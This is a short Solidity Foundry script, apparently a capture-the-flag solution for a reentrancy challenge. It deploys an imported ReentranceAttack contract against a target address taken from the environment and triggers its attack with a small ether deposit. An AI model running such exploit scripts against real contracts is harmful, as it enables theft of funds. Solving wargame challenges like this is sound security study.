// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {Reentrance, ReentranceAttack} from "../src/Reentrance.sol";

contract SolveReentrance is Script {

    Reentrance public reentrance;
    ReentranceAttack public reentranceAttack;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        reentrance = Reentrance(payable(vm.envAddress("REENTRANCE_ADDRESS")));
        reentranceAttack = new ReentranceAttack(payable(vm.envAddress("REENTRANCE_ADDRESS")));
        reentranceAttack.attack{value: 0.001 ether}();
        vm.stopBroadcast();
    }
}
